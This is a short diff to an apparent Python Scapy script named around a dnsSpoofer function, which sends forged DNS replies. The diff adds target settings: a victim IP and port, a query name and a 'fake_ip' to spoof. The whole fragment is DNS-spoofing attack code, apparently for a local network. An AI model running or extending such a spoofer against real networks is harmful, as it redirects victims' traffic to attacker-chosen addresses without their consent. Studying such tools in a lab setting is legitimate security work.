@@ -21,6 +21,15 @@ def dnsSpoofer(packet):
       sc.send(reply_packet, verbose=1)
       print(f"\nsent spoofed packet: {reply_packet}")
       print({packet[sc.IP].src})
+
+
+victim_ip = "192.168.1.10"
+victim_port = 33333
+query_name = "example.com."
+fake_ip = "1.2.3.4"  # The IP you want to spoof
+
+
+
       
 
 
